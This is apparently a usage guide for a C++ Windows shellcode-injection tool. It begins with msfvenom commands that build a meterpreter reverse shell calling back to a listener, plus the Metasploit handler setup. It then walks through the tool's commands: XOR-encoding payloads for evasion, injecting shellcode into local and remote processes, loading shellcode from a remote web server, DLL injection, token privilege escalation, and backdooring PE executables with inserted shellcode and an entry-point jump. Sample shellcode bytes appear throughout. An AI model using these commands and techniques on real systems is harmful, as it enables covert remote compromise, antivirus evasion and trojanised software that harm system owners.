A fully functional Windows injection analysis tool developed in C++, leveraging native Win32 user-mode APIs to perform low-level operations related to processes, memory, and executable files. Featuring a modular architecture design and standardized command-line interaction, the tool integrates capabilities such as payload encoding/decoding, binary byte conversion, remote process DLL injection, remote process ShellCode injection, PE file static modification, and cross-architecture compatibility. It can be applied to scenarios including learning injection principles, analyzing ShellCode evasion techniques, PE file structure reverse engineering, and reproducing malicious injection behavior characteristics.

This tool is primarily used in conjunction with Metasploit to generate ShellCode. When generating ShellCode with Metasploit, this tool can perform operations such as encoding, injection, and uninstallation. To use this tool, you must first generate ShellCode compatible with the target system architecture, convert it into a byte array format, encode it using the built-in encoder, and then inject the encoded result into the target process.

Generate a payload using the Metasploit tool, and the following is the 32-bit payload generation command.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
```

The configuration of the backend listener needs to correspond to the number of bits in the payload when using the tool. These options will tell Metasploit which payload to use and which IP address and port to bind the listener to. The ExitOnSession option is optional. If set to false, the listener will not automatically exit after establishing a session and can continue to wait for new connections. The final exploit - j command sets the listener to run in the background.

```bash
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost 10.0.66.22
msf6 > set lport 9999
msf6 exploit(multi/handler) > exploit
```

## Show

Used to display all currently injectable processes, this command can quickly obtain a list of all running processes in the current system.

```bash
C:> LyInjector Show
[*] PID：     4 | Number of digits: x64 | Process Name：System
[*] PID：   124 | Number of digits: x64 | Process Name：Registry
[*] PID：   588 | Number of digits: x64 | Process Name：smss.exe
[*] PID：   872 | Number of digits: x64 | Process Name：csrss.exe
[*] PID：   972 | Number of digits: x64 | Process Name：wininit.exe
[*] PID：   980 | Number of digits: x64 | Process Name：csrss.exe
[*] PID：   496 | Number of digits: x64 | Process Name：services.exe
[*] PID：  6624 | Number of digits：x32 | Process Name：lyshark.exe
[*] PID：  9196 | Number of digits: x64 | Process Name：SearchProtocolHost.exe
[*] PID： 11376 | Number of digits: x64 | Process Name：LyInjector.exe
```

## ShowDll

List the names and memory address information of all dynamic link library (DLL) modules loaded in the specified process. Assist developers and system administrators in viewing DLL modules loaded in processes for diagnosis and debugging purposes, as well as for security auditing and malware detection to identify potential security issues.

```bash
C:> LyInjector ShowDll --proc lyshark.exe
[+] DLLname:           USER32.dll | DLL base address: 0x0000000076B70000
[+] DLLname:        MSVCR120D.dll | DLL base address: 0x000000006A3E0000
[+] DLLname:         KERNEL32.dll | DLL base address: 0x00000000773A0000
```

## Promote

Attempt to enhance its own process permissions. Process permissions refer to the level of permissions that a process has in the operating system, and different permission levels can allow the process to perform different operations.

```bash
C:> LyInjector Promote
[+] Get your own Token
[+] Query process privileges
[*] Promoted to Super Administrator
```

## FreeDll

Attempt to uninstall a dynamic link library (DLL) module within a specified process. Users can release an already loaded DLL module to reload the updated DLL module or resolve some resource leakage issues.

```bash
C:> LyInjector FreeDll --proc lyshark.exe --dll MSVCR120D.dll
[*] Module uninstallation status: 1
```

## GetFuncAddr

Display the base address (address) of a function within a specific module of a specified process. With this command, users can obtain the memory address information of functions within a specific module, which is very useful for development and debugging tasks that require direct access to specific functions.

```bash
C:> LyInjector GetFuncAddr --proc lyshark.exe --dll user32.dll --func MessageBoxA
[+] Function address: 0x76bf0ba0

C:> LyInjector GetFuncAddr --proc lyshark.exe --dll user32.dll --func MessageBoxW
[+] Function address: 0x76bf10c0
```

## Format

Format the attack payload as a single line of pure string for use in different application scenarios, such as executing on the command line, sending to network traffic, or writing scripts.

```bash
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
"\x0c\x89\xe5\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

C:> LyInjector Format --path d://shellcode.txt

fce88f0000006031d2648b52308b520c89e58b521431ff0fb74a268b7228f0b5a2566a0053ffd5
```

## FormatFile

Format the attack payload as a single line of pure string and write the result to a text file.

```bash
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
"\x0c\x89\xe5\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

C:> LyInjector FormatFile --path d://shellcode.txt --output d://output.txt
[+] Saved => d://output.txt
```

## Xor

XOR the compressed byte array in the text and output it. It can XOR the compressed byte array in the text and output the result.

```bash
C:> LyInjector Xor --path d://output.txt --passwd lyshark
% &{{%ssssssuspr'quw{!vqps{!vqs {z&v{!vqrwpr%%s%!tw"qu{!tqq{%s!v"qvuu"ssvp%%'v
```

## Xchg

Convert the compressed string to byte array format, which can convert the compressed string to byte array format.

```bash
C:> LyInjector Xchg --input d://output.txt --output d://array.txt
[+] Byte converted to double byte
[*] The ShellCode list has been written out => d://array.txt

"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
"\x0c\x89\xe5\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
```

## XorArray

Encrypt or decrypt byte arrays into byte array format, which can encrypt or decrypt byte arrays and output the encrypted or decrypted results.

```bash
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
"\x0c\x89\xe5\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

C:> LyInjector XorArray --path d://shellcode.txt --passwd lyshark
unsigned char ShellCode[] =
"\xbf\xab\xcc\x43\x43\x43\x23\x72\x91\x27\xc8\x11\x73\xc8\x11\x4f"
"\xca\xa6\xc8\x11\x57\x72\xbc\x4c\xf4\x9\x65\xc8\x31\x6b\xb3"
"\xf6\xe1\x15\x29\x43\x10\xbc\x96";
```

## InjectDLL

Injecting a DLL module into a specific process can inject the DLL module into the memory space of the specific process, allowing the process to call functions of the DLL module.

```bash
C:> LyInjector InjectDLL --proc lyshark.exe --dll d://hook.dll
[*] Module [d://hook. dll] has been injected into process [6624]
```

## InjectSelfShell

Injecting the ShellCode string into its own process and running it, it can inject the ShellCode string into the memory space of its own process and run the ShellCode.

```bash
C:> LyInjector InjectSelfShell --shellcode fce88f00002c201...
[+] Decoding address: 19db64
```

## InjectArrayByte

Injecting byte arrays into its own process allows it to inject byte arrays into the memory space of its own process, thereby achieving some custom functions.

```bash
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

C:> LyInjector InjectArrayByte --path d://shellcode.txt
[+] Decoding address: 19df20
```

## FileInjectShell

Inject a compressed ShellCode string into its own process and execute it.

```bash
fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...

C:> LyInjector FileInjectShell --path d://output_shellcode.txt

[+] Decoding address: 19df20
```

## InjectWebShell

Load a string from a remote web server and inject it into its own process.

```bash
192.168.1.100:80/shellcode.raw
fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...

C:> LyInjector InjectWebShell --address 192.168.1.100 --payload shellcode.raw
```

## EncodeInFile

Inject the encrypted attack payload directly into its own process.

```bash
C:> LyInjector Xor --path d://output_shellcode.txt --passwd lyshark

% &{{%ssssssuspr'quw{!vqps{z&v{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'sr 

C:> LyInjector EncodeInFile --path d://xor_shellcode.txt --passwd lyshark

[+] Decode ShellCode bytes => 708 bytes
[+] Format ShellCode byte address => 19df00
[*] Activate the current bounce thread => 2a60000
```

## InjectProcShell

Inject attack payload into remote process.

```bash
C:> LyInjector InjectProcShell --pid 13372 --shellcode fce88f0000006031d2648b523089e...

[*] Start injecting process PID => 13372
[+] Open process: 360
[+] Permissions have been set: 3866624
[*] Create Thread ID => 352
```

## EncodePidInFile

Inject encrypted attack payload.

```bash
% &{{%ssssssuspr'quw{!vqps{z&v{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'sr 

C:> LyInjector EncodePidInFile --pid 8384 --path d://xor_shellcode.txt --passwd lyshark

[+] Decoding ShellCode bytes => 708 bytes
[+] Reading ShellCode length => 1687292
[*] Starting injection process PID => 8384 Length => 354
[+] Opening process: 340
[+] Permissions set: 12451840
[*] Creating thread ID => 356
```

## AddSection

Add a new section to the PE file.

```bash
C:> LyInjector AddSection --path d://lyshark.exe --section .hack --size 1024

[-] Current DOS header: 0x2130000
[-] Current NT header: 0x0000000002130108
[-] Locate the starting address of the current section table: 0x02130200
[+] Copy section name: .hack
[+] Section table memory size: 1024
Section memory starting location: 0x000B7000
The file size of section
[-] is 4096
The starting position of the file in section
[*] is 0x000A7000 => DEC: 684032
```

## InsertShellCode

Insert ShellCode into the specified location in PE.

```bash
C:> LyInjector InsertShellCode --path d://lyshark.exe --shellcode d://shellcode.txt --offset 1233

0xFC 0xE8 0x8F 0x00 0x00 0x00 0x60 0x31 0xD2 0x64 0x8B 0x52 0x30 0x8B 0x52 0x0C
0x89 0xE5 0x8B 0x52 0x14 0x31 0xFF 0x0F 0xB7 0x4A 0x26 0x8B 0x72 0x28 0xF0 0xB5
0xA2 0x56 0x6A 0x00 0x53 0xFF 0xD5

[*] ShellCode has been injected into the PE file
[+] Injection start FOA => 0x000004D1 <DEC = 1233 > Injection end FOA => 0x000004F8 <DEC = 1272 >
```

## RepairShellOep

Add an instruction to jump back to the original address at the end of ShellCode.

```bash
C:>LyInjector RepairShellOep --path d://lyshark.exe --start_offset 1230 --end_offset 1240

[+] Obtain original OEP => 0x000D8865
[+] Add JMP jump instructions at the end of ShellCode: 0x90 0x90 0x90 0x90 0xB8 0x65 0x88
[*] Added code segment to jump to 0x000004D8
[+] Modify the new entry address: 0x0007C4CE
```
